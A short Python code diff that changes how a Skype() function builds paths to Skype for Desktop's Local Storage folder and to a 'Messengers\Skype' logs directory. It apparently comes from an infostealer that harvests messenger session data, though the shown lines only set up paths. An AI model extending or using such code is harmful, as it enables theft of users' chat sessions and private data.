@@ -5,9 +5,8 @@ from preferences.config import config
 
 def Skype():
     data = ""
-    local = environ['USERPROFILE'] + sep + r'AppData\Local'
-    user = environ['USERPROFILE']
-    pathToLogs = f'{user}\\{config.pathToLogs}\\Messengers\\Skype'
+    local = environ["LOCALAPPDATA"]
+    pathToLogs = f'{config.pathToLogs}\\Messengers\\Skype'
     path1 = r"\Microsoft\Skype for Desktop\Local Storage"
     try:
         makedirs(pathToLogs, exist_ok=True)
